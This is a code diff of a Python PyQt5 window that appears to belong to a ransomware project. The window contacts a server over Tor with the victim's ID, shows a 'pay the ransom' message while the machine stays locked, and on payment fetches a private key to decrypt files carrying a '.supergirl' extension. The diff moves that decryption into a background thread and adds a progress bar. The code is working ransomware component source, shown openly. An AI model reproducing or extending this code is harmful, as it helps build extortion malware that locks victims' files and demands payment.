@@ -1,14 +1,13 @@
 from PyQt5 import QtCore
 from PyQt5.QtCore import QSize
 from PyQt5.QtGui import QImage, QPalette, QBrush, QFont
-from PyQt5.QtWidgets import QLabel, QPushButton, QWidget, QMessageBox, QTextEdit
+from PyQt5.QtWidgets import QLabel, QPushButton, QWidget, QMessageBox, QTextEdit, QProgressBar
 from Helper import Helper
 from TorManager import TorManager
 import Config
 import json
 import base64
-from pathlib import Path
-from FileCrypter import FileCrypter
+import DecryptThread
 
 
 class GUI(QWidget):
@@ -51,6 +50,10 @@ class GUI(QWidget):
             encrypt_text = encrypt_info_file.read().replace('\n', '')
         self.infoText.setHtml(encrypt_text)
 
+        self.progressBar = QProgressBar(self)
+        self.progressBar.setRange(0, 0)
+        self.progressBar.setGeometry(20, 550, 500, 24)
+        self.progressBar.hide()
 
         #button decrypt
         self.btnDecrypt = QPushButton("Decrypt", self)
@@ -60,6 +63,7 @@ class GUI(QWidget):
         self.btnDecrypt.clicked.connect(self.decryptData)
 
     def decryptData(self):
+        self.progressBar.show()
         tor = TorManager()
         r = tor.getSession()
         req = r.get(Config.API_URL + "/decrypt/" + self.uuid)
@@ -68,21 +72,6 @@ class GUI(QWidget):
             QMessageBox.question(self, "Still locked...", "Your machine is still locked\nPlease pay the ransom", QMessageBox.Ok)
         elif data['STATUS'] == "SUCCESS":
             privkey = base64.b64decode(data['priv_key']).decode('utf-8')
-            pathlist = Path('./test_files').glob('**/*.supergirl')
-            not_encrypted = []
-            h = Helper()
-            for path in pathlist:
-                path_in_str = str(path)
-                fc = FileCrypter()
-                try:
-                    fc.decrypt_file(path_in_str, privkey)
-                    h.info("Decrypted " + path_in_str)
-                except IOError:
-                    not_encrypted.append(path_in_str)
-                    h.error("Could not decrypt " + path_in_str)
-            if len(not_encrypted) > 0:
-                QMessageBox.question(self, "Error", "Files: " + str(not_encrypted) + " could not be decrypted", QMessageBox.Ok)
-            else:
-                QMessageBox.question(self, "Something happend", "All Files have been successfully decrypted!", QMessageBox.Ok)
-            import sys
-            sys.exit()
+
+            self.decryptThread = DecryptThread.DecryptThread(privkey)
+            self.decryptThread.start()
